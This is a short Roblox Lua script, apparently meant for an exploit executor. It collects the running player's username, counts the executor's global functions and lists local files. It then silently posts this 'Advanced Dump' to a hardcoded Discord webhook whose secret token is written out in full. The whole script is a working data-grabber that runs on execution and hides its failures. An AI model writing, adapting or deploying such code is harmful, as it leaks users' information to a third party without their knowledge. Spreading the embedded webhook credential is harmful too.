local HttpService = game:GetService("HttpService")
local webhookUrl = "https://discord.com/api/webhooks/1540769300225466468/t61SPD-DFDxsX6QjHvQg_1GmESBYTXJ3fmWiog7K514CQK-cxeV8-0dKXaAuhBbk3KKY"

local function extractAdvancedData()
    local envInfo = {}
    
    -- Analisi delle funzioni globali dell'executor
    if getgenv then
        for i, _ in pairs(getgenv()) do
            table.insert(envInfo, tostring(i))
        end
    end
    
    local report = string.format("User: %s\nExecutor Env Functions: %d", game:GetService("Players").LocalPlayer.Name, #envInfo)
    
    -- Controllo file di sistema locali se l'executor supporta il file system
    if listfiles and readfile then
        local success, files = pcall(listfiles, "")
        if success then
            report = report .. "\nLocal Files Cached: " .. #files
        end
    end

    local payload = {
        ["content"] = "```yaml\n[+] Advanced Dump:\n" .. report .. "\n```"
    }
    
    pcall(function()
        if request then
            request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        else
            HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload))
        end
    end)
end

extractAdvancedData()
